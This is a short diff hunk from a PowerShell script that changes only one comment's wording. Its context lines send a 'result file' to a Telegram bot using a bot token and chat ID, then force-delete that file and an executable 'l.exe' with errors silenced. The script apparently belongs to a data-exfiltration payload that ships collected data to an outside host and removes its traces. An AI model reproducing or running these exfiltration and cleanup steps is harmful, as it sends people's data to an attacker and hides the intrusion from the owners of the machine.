@@ -67,7 +67,7 @@ try {
 # Send the result file
 Send-TelegramFile -BotToken $BotToken -ChatID $ChatID -FilePath $ResultFile
 
-# Cleanup left files
+# Cleanup leftover files
 Remove-Item $ResultFile, "$Test/l.exe" -Force -ErrorAction SilentlyContinue
 
 # Exit
